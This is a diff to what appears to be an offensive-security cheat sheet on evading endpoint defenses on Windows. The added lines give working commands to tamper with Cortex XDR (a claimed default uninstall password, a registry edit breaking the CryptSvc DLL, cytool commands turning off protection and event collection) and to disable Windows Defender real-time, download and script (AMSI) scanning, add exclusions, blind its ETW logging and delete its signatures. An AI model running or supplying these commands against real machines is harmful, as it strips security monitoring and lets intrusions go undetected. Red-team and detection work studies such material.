@@ -64,6 +64,27 @@ PS> attrib +h mimikatz.exe
     Elastic Agent will be uninstalled from your system at C:\Program Files\Elastic\Agent. Do you want to continue? [Y/n]:Y
     Elastic Agent has been uninstalled.
     ```
+* [Cortex XDR](https://mrd0x.com/cortex-xdr-analysis-and-bypass/)
+    ```ps1
+    # Global uninstall password: Password1
+    Password hash is located in C:\ProgramData\Cyvera\LocalSystem\Persistence\agent_settings.db
+    Look for PasswordHash, PasswordSalt or password, salt strings.
+
+    # Disable Cortex: Change the DLL to a random value, then REBOOT
+    reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f
+
+    # Disables the agent on startup (requires reboot to work)
+    cytool.exe startup disable
+
+    # Disables protection on Cortex XDR files, processes, registry and services
+    cytool.exe protect disable
+
+    # Disables Cortex XDR (Even with tamper protection enabled)
+    cytool.exe runtime disable
+
+    # Disables event collection
+    cytool.exe event_collection disable
+    ```
 
 ### Disable Windows Defender
 
@@ -73,18 +94,29 @@ sc config WinDefend start= disabled
 sc stop WinDefend
 Set-MpPreference -DisableRealtimeMonitoring $true
 
-# Wipe currently stored definitions
-# Location of MpCmdRun.exe: C:\ProgramData\Microsoft\Windows Defender\Platform\<antimalware platform version>
-MpCmdRun.exe -RemoveDefinitions -All
-
 ## Exclude a process / location
 Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
 Add-MpPreference -ExclusionProcess 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
 Add-MpPreference -ExclusionPath C:\Video, C:\install
 
+# Disable scanning all downloaded files and attachments, disable AMSI (reactive)
+PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
+PS C:\> Set-MpPreference -DisableIOAVProtection $true
+# Disable AMSI (set to 0 to enable)
+PS C:\> Set-MpPreference -DisableScriptScanning 1 
+
 # Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions
 reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
+
+# Wipe currently stored definitions
+# Location of MpCmdRun.exe: C:\ProgramData\Microsoft\Windows Defender\Platform\<antimalware platform version>
+MpCmdRun.exe -RemoveDefinitions -All
+
+# Remove signatures (if Internet connection is present, they will be downloaded again):
+PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
+PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ```
+
 
 ### Disable Windows Firewall
 
